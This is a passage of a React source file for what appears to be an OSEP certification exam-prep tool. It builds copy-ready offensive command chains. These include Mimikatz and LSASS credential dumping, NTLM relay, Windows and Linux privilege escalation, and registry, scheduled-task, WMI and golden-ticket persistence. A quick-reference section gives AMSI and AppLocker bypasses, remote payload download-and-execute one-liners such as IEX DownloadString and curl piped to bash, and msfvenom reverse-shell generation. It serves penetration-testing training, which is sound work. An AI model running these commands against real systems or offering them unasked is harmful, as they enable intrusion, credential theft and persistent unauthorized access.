{action:"Ligolo-ng pivoting",cmd:(v)=>`# Proxy (attacker):\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# Agent (target):\n./agent -connect ${v.lhost||"LHOST"}:11601 -ignore-cert\n\n# In proxy:\nsession\nstart\n\n# Add route:\nsudo ip route add INTERNAL_SUBNET/24 dev ligolo`,check:"Internal network accessible?"},
]},
];

// ─── CREDENTIAL DUMPING ───
const CRED_CHAIN=[
{phase:"13. Credential Dumping",desc:"Extract credentials from memory, registry, and files.",steps:[
{action:"Mimikatz (sekurlsa)",cmd:(v)=>`# From memory (requires local admin):\nmimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"\n\n# PowerShell (in-memory):\nIEX(New-Object Net.WebClient).DownloadString('http://${v.lhost||"LHOST"}/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -DumpCreds\n\n# From Linux:\nimpacket-secretsdump '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.target||"TARGET"}`,check:"NTLM hashes? Cleartext passwords?",critical:true},
{action:"Dump LSASS process",cmd:(v)=>`# procdump (SysInternals — whitelisted by AV):\nprocdump.exe -ma lsass.exe lsass.dmp\n\n# comsvcs.dll (no tools needed):\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump PID lsass.dmp full\n\n# Task Manager: right-click lsass.exe -> Create dump\n\n# Parse offline with Mimikatz:\nmimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit\n\n# Or pypykatz (Python):\npypykatz lsa minidump lsass.dmp`,check:"LSASS dump captured? Parsed offline?",critical:true},
{action:"SAM + SYSTEM hive dump",cmd:(v)=>`# Registry save (requires admin):\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SYSTEM system.save\nreg save HKLM\\SECURITY security.save\n\n# Parse offline:\nimpacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL\n\n# Or Volume Shadow Copy:\nvssadmin create shadow /for=C:\n# Copy from shadow`,check:"Local account hashes extracted?"},
{action:"NTLM Relay (ntlmrelayx)",cmd:(v)=>`# Setup Responder (poisoner only, no HTTP/SMB server):\nsudo responder -I eth0 -r -d -w\n\n# Run relay to target without SMB signing:\nimpacket-ntlmrelayx -t ${v.target||"TARGET"} -smb2support -i\n\n# Or execute command:\nimpacket-ntlmrelayx -t ${v.target||"TARGET"} -smb2support -c "whoami"\n\n# Check SMB signing:\nnetexec smb ${v.subnet||"10.10.10.0/24"} --gen-relay-list nosigning.txt`,check:"SMB signing disabled? Relay worked?",critical:true},
]},
];

// ─── PRIVILEGE ESCALATION ───
const PRIVESC_CHAIN=[
{phase:"14. Windows Privilege Escalation",desc:"Escalate from user to SYSTEM/admin on compromised hosts.",steps:[
{action:"Check current privileges",cmd:(v)=>`whoami /priv\nwhoami /groups\nsysteminfo\n\n# Automated enum:\nwinPEAS.exe\npowershell IEX(New-Object Net.WebClient).DownloadString('http://${v.lhost||"LHOST"}/PowerUp.ps1');Invoke-AllChecks`,check:"SeImpersonate? SeAssignPrimaryToken? SeBackup?",critical:true},
{action:"Potato attacks (SeImpersonatePrivilege)",cmd:(v)=>`# GodPotato (works on all Windows versions):\nGodPotato.exe -cmd "cmd /c whoami"\nGodPotato.exe -cmd "cmd /c C:\\Windows\\Tasks\\payload.exe"\n\n# PrintSpoofer:\nPrintSpoofer.exe -i -c cmd\n\n# JuicyPotato (older systems):\nJuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\\Windows\\Tasks\\payload.exe" -t *`,check:"Got SYSTEM from service account?",critical:true},
{action:"Unquoted service paths",cmd:(v)=>`# Find vulnerable services:\nwmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows" | findstr /i /v "\""\n\n# Or PowerShell:\nGet-WmiObject win32_service | Where {$_.PathName -notlike "*\"*"} | Select Name,PathName`,check:"Unquoted path with spaces?"},
{action:"Token impersonation",cmd:(v)=>`# Incognito (Meterpreter):\nload incognito\nlist_tokens -u\nimpersonate_token "${v.domain||"CORP"}\\Administrator"\n\n# From command line:\nRunasCs.exe administrator password cmd.exe -d ${v.domain||"corp.local"}`,check:"Admin tokens available?"},
]},
{phase:"15. Linux Privilege Escalation",desc:"Escalate on compromised Linux hosts.",steps:[
{action:"Automated enumeration",cmd:(v)=>`# LinPEAS:
curl http://${v.lhost||"LHOST"}/linpeas.sh | bash\n\n# Manual:
sudo -l\nfind / -perm -4000 2>/dev/null\ncrontab -l\ncat /etc/crontab\nls -la /etc/cron*\ngetcap / -r 2>/dev/null`,check:"SUID? Sudo? Cron? Capabilities?",critical:true},
{action:"Sudo abuse",cmd:(v)=>`# Check GTFOBins for any sudo entry:\nsudo -l\n\n# Examples:\nsudo vim -c ':!bash'\nsudo python3 -c 'import os; os.system("/bin/bash")'\nsudo /usr/bin/env /bin/bash\nsudo find / -exec /bin/bash \\;`,check:"sudo entry exploitable?",critical:true},
{action:"SUID exploitation",cmd:(v)=>`# Find SUID binaries:\nfind / -perm -4000 -type f 2>/dev/null\n\n# Check GTFOBins for each:\n# Custom SUID: try strings, ltrace, strace\nstrings /path/to/suid_binary\nstrace /path/to/suid_binary 2>&1 | head -50`,check:"Exploitable SUID binary?"},
]},
];

// ─── PERSISTENCE ───
const PERSIST_CHAIN=[
{phase:"13. Persistence Mechanisms",desc:"Maintain access after reboot or password change.",steps:[
{action:"Registry Run key",cmd:(v)=>`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "C:\\Windows\\Tasks\\payload.exe"\n\n# Or HKLM (requires admin):\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "C:\\Windows\\Tasks\\payload.exe"`,check:"Payload persists after logon?"},
{action:"Scheduled Task",cmd:(v)=>`schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Tasks\\payload.exe" /sc onlogon /ru SYSTEM\n\n# Or every 15 minutes:\nschtasks /create /tn "Monitoring" /tr "powershell -ep bypass -w hidden -f C:\\Windows\\Tasks\\beacon.ps1" /sc minute /mo 15`,check:"Task runs automatically?"},
{action:"WMI Event Subscription",cmd:(v)=>`# PowerShell WMI persistence:\n$filterArgs = @{\n  EventNamespace = 'root/cimv2'\n  Name = 'BotFilter'\n  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"\n  QueryLanguage = 'WQL'\n}\n$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs\n# ... consumer + binding`,check:"WMI trigger established?"},
{action:"Golden Ticket persistence",cmd:(v)=>`# With krbtgt hash, you have indefinite access:\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain '${v.domain||"corp.local"}' -duration 3650 administrator\n\n# This ticket stays valid even if user passwords change\n# Only invalidated by resetting krbtgt password TWICE`,check:"Indefinite domain access?"},
]},
];

// ─── CHECKLIST ───
const CHECKLIST={
"Flags & Scoring (Need 100pts or secret.txt)":[
"local.txt from Machine 1","proof.txt from Machine 1",
"local.txt from Machine 2","proof.txt from Machine 2",
"local.txt from Machine 3","proof.txt from Machine 3",
"local.txt from Machine 4","proof.txt from Machine 4",
"local.txt from Machine 5","proof.txt from Machine 5",
"local.txt from Machine 6","proof.txt from Machine 6",
"local.txt from Machine 7","proof.txt from Machine 7",
"local.txt from Machine 8","proof.txt from Machine 8",
"local.txt from Machine 9","proof.txt from Machine 9",
"local.txt from Machine 10","proof.txt from Machine 10",
"secret.txt (alternative pass condition)",
],
"Methodology Checklist":[
"Network sweep + full port scan completed","Domain Controllers identified",
"BloodHound data collected + analyzed","AV/EDR products identified on each host",
"AppLocker / CLM status checked","AMSI bypass prepared",
"Custom payload compiled + tested","Client-side attack vector prepared (if needed)",
"Kerberoast + AS-REP Roast attempted","All lateral movement paths tested",
"MSSQL servers enumerated","Linked SQL servers checked",
"Credential dumping attempted (Mimikatz/lsass)","NTLM relay attempted on hosts without SMB signing",
"Windows privesc checked on each host","Linux privesc checked on each host",
"Cross-forest trusts enumerated","DCSync attempted when DA achieved",
],
"Report Requirements":[
"All steps documented with commands + output","Screenshots of each flag (local.txt + proof.txt)",
"Custom exploit code included + explained","AV evasion methodology documented",
"Network diagram of attack path","Report in PDF format, uploaded within 24h",
],
};

// ─── MILESTONES ───
const MILESTONES=[
{hour:0,label:"START — Network sweep, identify DCs, run BloodHound."},
{hour:2,label:"Recon done. Identify AV/EDR. Prepare evasion payloads."},
{hour:4,label:"First foothold. Run AMSI bypass + custom payload."},
{hour:8,label:"2-3 flags captured. Start lateral movement."},
{hour:12,label:"Multiple machines compromised. Try Kerberos attacks."},
{hour:16,label:"SLEEP — You have 48h, rest is critical."},
{hour:24,label:"Resume. Reassess attack paths. Try MSSQL/linked servers."},
{hour:30,label:"5+ flags. Attempt cross-forest or DCSync."},
{hour:36,label:"8+ flags or secret.txt. Final push."},
{hour:42,label:"Document everything. Verify all screenshots."},
{hour:47.75,label:"EXAM ENDS — Begin 24-hour report."},
];

// ─── QUICK REF ───
const QUICK_REF={
"AMSI Bypasses":[
{l:"Reflection bypass",c:"$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)"},
{l:"Obfuscated reflection",c:"$a='Am'+'si'+'Ut'+'ils';$b='am'+'si'+'In'+'it'+'Fa'+'il'+'ed';[Ref].Assembly.GetType(\"System.Management.Automation.$a\").GetField($b,'NonPublic,Static').SetValue($null,$true)"},
],
"AppLocker Bypasses":[
{l:"MSBuild",c:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml"},
{l:"InstallUtil",c:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe"},
{l:"Regsvr32",c:"regsvr32 /s /n /u /i:http://LHOST/payload.sct scrobj.dll"},
{l:"Mshta",c:"mshta http://LHOST/payload.hta"},
{l:"Trusted folders",c:"C:\\Windows\\Tasks\\, C:\\Windows\\Temp\\, C:\\Windows\\tracing\\"},
],
"LOLBins":[
{l:"Rundll32 JS",c:'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")'},
{l:"Certutil download",c:"certutil -urlcache -split -f http://LHOST/payload.exe payload.exe"},
{l:"Bitsadmin",c:"bitsadmin /transfer job http://LHOST/payload.exe C:\\Windows\\Tasks\\payload.exe"},
{l:"Cscript/wscript",c:"cscript //nologo payload.js"},
],
"Kerberos":[
{l:"Kerberoast",c:"impacket-GetUserSPNs 'domain/user:pass' -dc-ip DC -request -outputfile kerb.txt"},
{l:"AS-REP Roast",c:"impacket-GetNPUsers 'domain/' -usersfile users.txt -dc-ip DC -request"},
{l:"Golden Ticket",c:"impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain domain.local administrator"},
{l:"Silver Ticket",c:"impacket-ticketer -nthash SVC_HASH -domain-sid SID -domain domain.local -spn SPN admin"},
{l:"DCSync",c:"impacket-secretsdump 'domain/admin:pass'@DC_IP"},
],
"Lateral Movement":[
{l:"PsExec",c:"impacket-psexec 'domain/admin:pass'@TARGET"},{l:"WMIExec",c:"impacket-wmiexec 'domain/admin:pass'@TARGET"},
{l:"Evil-WinRM",c:"evil-winrm -i TARGET -u admin -p pass"},{l:"PtH",c:"impacket-psexec -hashes :HASH 'domain/admin'@TARGET"},
{l:"DCOM",c:"impacket-dcomexec -object ShellWindows 'domain/admin:pass'@TARGET 'cmd'"},
],
"Pivoting":[
{l:"Chisel server",c:"chisel server --port 8080 --reverse"},{l:"Chisel client",c:"chisel client LHOST:8080 R:socks"},
{l:"Ligolo proxy",c:"./proxy -selfcert -laddr 0.0.0.0:11601"},{l:"Ligolo agent",c:"./agent -connect LHOST:11601 -ignore-cert"},
{l:"SSH SOCKS",c:"ssh -D 1080 user@TARGET"},{l:"SSH local fwd",c:"ssh -L 8080:INTERNAL:80 user@TARGET"},
],
"Shellcode Runners":[
{l:"msfvenom csharp",c:"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f csharp"},
{l:"msfvenom VBA",c:"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f vbapplication"},
{l:"msfvenom raw",c:"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.bin"},
],
};

// ━━━ CSS ━━━
const CSS=`
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&display=swap');
:root{--b0:#06080b;--b1:#0b0e13;--b2:#111519;--b3:#191e26;--b4:#222831;--bd:#272e38;--bd2:#333c4a;--t0:#f3f5f7;--t1:#b3bcc8;--t2:#6c7585;--ac:#a855f7;--acd:rgba(168,85,247,0.1);--g:#22c55e;--gd:rgba(34,197,94,0.08);--r:#ef4444;--y:#eab308;--cg:#6ee7b7;--m:'IBM Plex Mono',monospace;--s:'Outfit',system-ui,sans-serif}
*{margin:0;padding:0;box-sizing:border-box}body{background:var(--b0);color:var(--t1);font-family:var(--s)}
.app{min-height:100vh;display:flex;flex-direction:column}
.hdr{background:var(--b1);border-bottom:1px solid var(--bd);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
.logo{font-family:var(--s);font-weight:900;font-size:18px;letter-spacing:-0.5px;background:linear-gradient(135deg,#a855f7,#ec4899,#f43f5e);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo-sub{font-size:9px;color:var(--t2);letter-spacing:3px;text-transform:uppercase;font-weight:500}
.inps{display:flex;gap:4px;flex-wrap:wrap}
.inp{background:var(--b0);border:1px solid var(--bd);border-radius:4px;padding:5px 7px;color:var(--t0);font-size:10px;font-family:var(--m);outline:none;width:110px;transition:border .2s}
.inp:focus{border-color:var(--ac)}.inp::placeholder{color:var(--t2)}
.tabs{display:flex;background:var(--b1);border-bottom:1px solid var(--bd);overflow-x:auto;padding:0 8px;gap:1px}
.tab{padding:8px 12px;font-size:11px;font-weight:600;font-family:var(--s);color:var(--t2);background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s}
.tab:hover{color:var(--t1)}.tab.on{color:var(--ac);border-bottom-color:var(--ac);background:var(--b2)}
.main{flex:1;padding:14px 16px;max-width:1100px;margin:0 auto;width:100%}
.phase{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:10px;overflow:hidden}
.phase-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:background .1s}
.phase-h:hover{background:var(--b3)}
.phase-num{width:26px;height:26px;border-radius:6px;background:var(--acd);border:1px solid var(--ac);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:var(--ac);flex-shrink:0}
.phase-num.done{background:var(--g);border-color:var(--g);color:#fff}
.phase-title{font-size:13px;font-weight:700;color:var(--t0)}
.phase-desc{font-size:11px;color:var(--t2)}
.steps-wrap{border-top:1px solid var(--bd)}
.step{border-bottom:1px solid var(--bd)}.step:last-child{border-bottom:none}
.step-row{padding:8px 14px;display:flex;align-items:flex-start;gap:8px;cursor:pointer;transition:background .1s}
.step-row:hover{background:var(--b3)}
.snum{width:20px;height:20px;border-radius:50%;background:var(--b0);border:1px solid var(--bd);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:var(--t2);flex-shrink:0;margin-top:1px;transition:all .15s}
.snum.crit{border-color:var(--ac);color:var(--ac);background:var(--acd)}
.snum.done{border-color:var(--g);color:#fff;background:var(--g)}
.s-act{font-size:12px;font-weight:600;color:var(--t0)}.s-chk{font-size:10px;color:var(--t2);margin-top:1px}
.s-exp{background:var(--b0);margin:0 10px 10px 42px;border-radius:5px;border:1px solid var(--bd);padding:8px 10px}
.cmd{font-family:var(--m);font-size:11px;color:var(--cg);white-space:pre-wrap;word-break:break-all;line-height:1.65}
.cp{background:var(--b3);border:1px solid var(--bd);border-radius:3px;padding:2px 8px;font-size:9px;color:var(--t2);cursor:pointer;font-family:var(--m);flex-shrink:0;transition:all .15s}
.cp:hover{border-color:var(--ac);color:var(--ac)}.cp.ok{border-color:var(--g);color:var(--g)}
.arrow{font-size:9px;color:var(--t2);transition:transform .2s;flex-shrink:0}.arrow.open{transform:rotate(90deg)}
.sec-title{font-size:12px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin:16px 0 10px}
.chk-item{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:4px;cursor:pointer;font-size:11.5px;transition:background .1s}
.chk-item:hover{background:var(--b3)}.chk-item.done{color:var(--g);opacity:.6;text-decoration:line-through}
.chk-box{width:15px;height:15px;border-radius:3px;border:1.5px solid var(--bd);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:9px;transition:all .15s}
.chk-box.on{background:var(--ac);border-color:var(--ac);color:#fff}
.prog{height:3px;background:var(--b3);border-radius:2px;margin-bottom:14px;overflow:hidden}
.prog-fill{height:100%;border-radius:2px;transition:width .3s}
.notes{width:100%;min-height:500px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:14px;color:var(--t0);font-family:var(--m);font-size:11.5px;line-height:1.8;resize:vertical;outline:none}
.notes:focus{border-color:var(--ac)}
.timer-bar{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:14px;margin-bottom:14px}
.timer-display{font-family:var(--m);font-size:28px;font-weight:700;color:var(--t0);text-align:center;margin-bottom:8px}
.timer-btns{display:flex;gap:6px;justify-content:center;margin-bottom:10px}
.timer-btn{padding:5px 14px;font-size:11px;font-weight:600;border-radius:4px;border:1px solid var(--bd);background:var(--b3);color:var(--t1);cursor:pointer;font-family:var(--s);transition:all .15s}
.timer-btn:hover{border-color:var(--ac);color:var(--ac)}
.timer-btn.active{background:var(--ac);border-color:var(--ac);color:#fff}
.milestone{display:flex;gap:10px;align-items:flex-start;padding:6px 0;font-size:11px}
.mile-h{font-family:var(--m);font-weight:700;color:var(--ac);min-width:40px;flex-shrink:0}
.mile-t{color:var(--t1)}.mile-now{color:var(--g);font-weight:600}
.qref-card{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:8px 12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:all .15s;margin-bottom:4px}
.qref-card:hover{border-color:var(--ac);background:var(--b3)}
.score-bar{display:flex;gap:4px;margin-bottom:14px;flex-wrap:wrap}
.score-seg{flex:1;padding:6px 8px;border-radius:4px;font-size:10px;font-weight:600;text-align:center;cursor:default;min-width:120px}
.decision-box{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:16px;margin-bottom:14px}
.decision-box h3{color:var(--ac);font-size:14px;margin-bottom:12px}
.decision-btn{display:block;width:100%;padding:10px 14px;margin-bottom:6px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;color:var(--t0);font-family:var(--s);font-size:12px;font-weight:600;cursor:pointer;text-align:left;transition:all .15s}
.decision-btn:hover{border-color:var(--ac);background:var(--acd)}
.decision-btn.active{border-color:var(--ac);background:var(--acd);color:var(--ac)}
.stuck-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:12px 14px;margin-bottom:8px}
.stuck-q{font-size:13px;font-weight:700;color:var(--t0);margin-bottom:4px}
.stuck-tip{font-size:11px;color:var(--t2);margin-bottom:6px}
.tpl-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:10px;overflow:hidden}
.tpl-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;transition:background .1s;font-size:12px;font-weight:700;color:var(--t0)}
.tpl-h:hover{background:var(--b3)}
.tpl-body{border-top:1px solid var(--bd);padding:10px 14px}
`;

// ━━━ COMPONENTS ━━━
function CopyBtn({text}){
  const[c,setC]=useState(false);
  return <button className={`cp ${c?'ok':''}`} onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(text);setC(true);setTimeout(()=>setC(false),1200)}}>{c?'✓':'Copy'}</button>
}

function PhaseList({phases,vals}){
  const[openP,setOpenP]=useState({0:true});
  const[openS,setOpenS]=useState({});
  const[doneS,setDoneS]=useState({});
  return(<div>{phases.map((phase,pi)=>{
    const isO=openP[pi]!==false;
    const allDone=phase.steps.every((_,si)=>doneS[`${pi}-${si}`]);
    return(<div className="phase" key={pi}>
      <div className="phase-h" onClick={()=>setOpenP(p=>({...p,[pi]:!p[pi]}))}>
        <div className={`phase-num ${allDone?'done':''}`}>{allDone?'✓':pi+1}</div>
        <div style={{flex:1}}><div className="phase-title">{phase.phase}</div><div className="phase-desc">{phase.desc}</div></div>
        <span className={`arrow ${isO?'open':''}`}>▶</span>
      </div>
      {isO&&<div className="steps-wrap">{phase.steps.map((step,si)=>{
        const k=`${pi}-${si}`;const isExp=openS[k];const isDone=doneS[k];
        const cmdText=step.cmd(vals);
        return(<div className="step" key={si}>
          <div className="step-row" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
            <div className={`snum ${isDone?'done':step.critical?'crit':''}`} onClick={e=>{e.stopPropagation();setDoneS(p=>({...p,[k]:!p[k]}))}}>{isDone?'✓':si+1}</div>
            <div style={{flex:1}}><div className="s-act">{step.action}</div><div className="s-chk">→ {step.check}</div></div>
            <CopyBtn text={cmdText}/>
          </div>
          {isExp&&<div className="s-exp"><div className="cmd">{cmdText}</div></div>}
        </div>)
      })}</div>}
    </div>)
  })}</div>)
}

// ━━━ TABS ━━━
function DecisionTab({vals}){
  const[mode,setMode]=useState(null);
  const chains={recon:RECON_CHAIN,evasion:EVASION_CHAIN,injection:INJECTION_CHAIN,client:CLIENT_CHAIN,lateral:LATERAL_CHAIN,ad:AD_CHAIN,mssql:MSSQL_CHAIN,cred:CRED_CHAIN,privesc:PRIVESC_CHAIN,persist:PERSIST_CHAIN};
  const labels={recon:"📡 Phase 0: Recon & Network Mapping",evasion:"🛡️ Phase 1: AV/EDR Evasion & AMSI/AppLocker Bypass",injection:"💉 Phase 2: Process Injection",client:"📧 Phase 3: Client-Side Attacks",lateral:"🔀 Phase 4: Lateral Movement (Win + Linux)",ad:"👑 Phase 5: AD & Kerberos Attacks",mssql:"🗃️ Phase 6: MSSQL & Network Bypass",cred:"🔑 Phase 7: Credential Dumping & NTLM Relay",privesc:"⬆️ Phase 8: Privilege Escalation (Win + Linux)",persist:"🔒 Phase 9: Persistence"};
  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)'}}>Corporate Network Sim</div>
      <div className="score-seg" style={{background:'var(--gd)',color:'var(--g)'}}>100pts (10 flags) or secret.txt</div>
      <div className="score-seg" style={{background:'rgba(234,179,8,.1)',color:'var(--y)'}}>47h45m exam + 24h report</div>
    </div>
    <div className="decision-box">
      <h3>🎯 What phase are you in?</h3>
      <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>OSEP tests evasion + AD exploitation in hardened environments. Select your current phase.</p>
      {Object.entries(labels).map(([k,v])=>(
        <button key={k} className={`decision-btn ${mode===k?'active':''}`} onClick={()=>setMode(k)}>{v}</button>
      ))}
    </div>
    {mode&&<PhaseList phases={chains[mode]} vals={vals}/>}
  </div>)
}

function QuickRefTab(){
  const[openS,setOpenS]=useState({});
  return(<div>{Object.entries(QUICK_REF).map(([cat,cmds])=>(
    <div key={cat}><div className="sec-title">{cat}</div>
    {cmds.map((c,i)=>{const k=`${cat}-${i}`;return(<div key={i}>
      <div className="qref-card" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
        <span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{c.l}</span><CopyBtn text={c.c}/>
      </div>
      {openS[k]&&<div className="s-exp" style={{margin:'0 0 8px 0'}}><div className="cmd">{c.c}</div></div>}
    </div>)})}</div>
  ))}</div>)
}

function ChecklistTab(){
  const[checked,setChecked]=useState({});
  const total=Object.values(CHECKLIST).flat().length;
  const done=Object.values(checked).filter(Boolean).length;
  const pct=total>0?Math.round(done/total*100):0;
  return(<div>
    <div style={{fontSize:11,color:'var(--t2)',marginBottom:6}}>{done}/{total} completed ({pct}%)</div>
    <div className="prog"><div className="prog-fill" style={{width:`${pct}%`,background:pct>=100?'var(--g)':pct>=70?'var(--y)':'var(--ac)'}}/></div>
    {Object.entries(CHECKLIST).map(([section,items])=>(
      <div key={section}><div className="sec-title">{section}</div>
      {items.map((item,i)=>{const k=`${section}-${i}`;const on=checked[k];return(
        <div key={i} className={`chk-item ${on?'done':''}`} onClick={()=>setChecked(p=>({...p,[k]:!p[k]}))}>
          <div className={`chk-box ${on?'on':''}`}>{on?'✓':''}</div><span>{item}</span>
        </div>)})}</div>
    ))}
  </div>)
}

function TimerTab(){
  const[running,setRunning]=useState(false);
  const[elapsed,setElapsed]=useState(0);
  const ref=useRef(null);
  const start=()=>{if(!running){setRunning(true);ref.current=setInterval(()=>setElapsed(e=>e+1),1000)}};
  const pause=()=>{setRunning(false);clearInterval(ref.current)};
  const reset=()=>{setRunning(false);clearInterval(ref.current);setElapsed(0)};
  useEffect(()=>()=>clearInterval(ref.current),[]);
  const hrs=Math.floor(elapsed/3600),mins=Math.floor((elapsed%3600)/60),secs=elapsed%60;
  const display=`${String(hrs).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
  const totalSec=47*3600+45*60,remaining=Math.max(0,totalSec-elapsed);
  const rH=Math.floor(remaining/3600),rM=Math.floor((remaining%3600)/60),rS=remaining%60;
  const remD=`${String(rH).padStart(2,'0')}:${String(rM).padStart(2,'0')}:${String(rS).padStart(2,'0')}`;
  const eH=elapsed/3600;
  return(<div>
    <div className="timer-bar">
      <div style={{fontSize:10,color:'var(--t2)',textAlign:'center',marginBottom:4}}>EXAM TIME (47h 45min)</div>
      <div className="timer-display">{display}</div>
      <div style={{fontSize:12,color:remaining<=3600?'var(--r)':'var(--t2)',textAlign:'center',marginBottom:8}}>Remaining: {remD}</div>
      <div className="prog"><div className="prog-fill" style={{width:`${Math.min(100,elapsed/totalSec*100)}%`,background:remaining<=3600?'var(--r)':remaining<=14400?'var(--y)':'var(--ac)'}}/></div>
      <div className="timer-btns">
        <button className={`timer-btn ${running?'active':''}`} onClick={start}>▶ Start</button>
        <button className="timer-btn" onClick={pause}>⏸ Pause</button>
        <button className="timer-btn" onClick={reset}>↺ Reset</button>
      </div>
    </div>
    <div className="sec-title">Milestones</div>
    {MILESTONES.map((m,i)=>{
      const next=i<MILESTONES.length-1?MILESTONES[i+1]:null;
      const isCur=eH>=m.hour&&(!next||eH<next.hour);
      const passed=eH>=m.hour;
      return(<div className="milestone" key={i}>
        <div className="mile-h">{m.hour}h</div>
        <div className={`mile-t ${isCur?'mile-now':''}`} style={{opacity:passed&&!isCur?.5:1}}>{isCur?'👉 ':''}{m.label}</div>
      </div>)
    })}
  </div>)
}

function NotesTab(){
  const[notes,setNotes]=useState(()=>localStorage.getItem('osep-notes-v1')||`# OSEP Exam Notes\n\n## Network Map\nSubnet: \nDC IP: \nDomain: \n\n## Machines\n### Machine 1\nIP: \nOS: \nAV/EDR: \nlocal.txt: \nproof.txt: \n\n### Machine 2\nIP: \nOS: \nAV/EDR: \nlocal.txt: \nproof.txt: \n\n## Credentials Found\n\n## Evasion Techniques Used\n\n## Attack Path\n`);
  useEffect(()=>{localStorage.setItem('osep-notes-v1',notes)},[notes]);
  return(<div>
    <p style={{fontSize:10,color:'var(--t2)',marginBottom:8}}>Notes saved to browser automatically.</p>
    <textarea className="notes" value={notes} onChange={e=>setNotes(e.target.value)} spellCheck={false}/>
  </div>)
}

// ━━━ TAB: I'M STUCK ━━━
function StuckTab(){
  const checks=[
    { q: "Is your payload being detected by AV/EDR?", cmd: "# Try different evasion:\n# 1. XOR/AES encrypt shellcode\n# 2. Use process injection instead of on-disk\n# 3. Try LOLBins (MSBuild, InstallUtil)\n# 4. Compile to .NET assembly, not .exe\n\n# Quick test - does basic calc work?\nmsfvenom -p windows/exec CMD=calc.exe -f csharp", tip: "If your payload works locally but not on target, AV is catching it. Try encrypting shellcode or using a LOLBin.", critical: true },
    { q: "Did you bypass AMSI?", cmd: "# Reflection bypass:\n$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n$f=$a.GetField('amsiInitFailed','NonPublic,Static')\n$f.SetValue($null,$true)\n\n# Test: 'Invoke-Mimikatz' should NOT be flagged", tip: "AMSI MUST be bypassed before running any PowerShell offensive tool. Try it first in every PowerShell session.", critical: true },
    { q: "Is Constrained Language Mode (CLM) enabled?", cmd: "# Check:\n$ExecutionContext.SessionState.LanguageMode\n\n# If ConstrainedLanguage:\n# Use C# runspace to get FullLanguage\n# Or use MSBuild inline task\n# Or use InstallUtil with C# payload", tip: "CLM blocks most offensive PowerShell. Use C# to create a PowerShell runspace in FullLanguage mode.", critical: true },
    { q: "Did you try ALL lateral movement methods?", cmd: "# PsExec:\nimpacket-psexec 'domain/admin:pass'@TARGET\n# WMIExec:\nimpacket-wmiexec 'domain/admin:pass'@TARGET\n# Evil-WinRM:\nevil-winrm -i TARGET -u admin -p pass\n# DCOM:\nimpacket-dcomexec -object ShellWindows 'domain/admin:pass'@TARGET\n# PtH:\nimpacket-psexec -hashes :HASH 'domain/admin'@TARGET", tip: "If one method fails, try another. Some are blocked by firewall rules or AV but others might work.", critical: true },
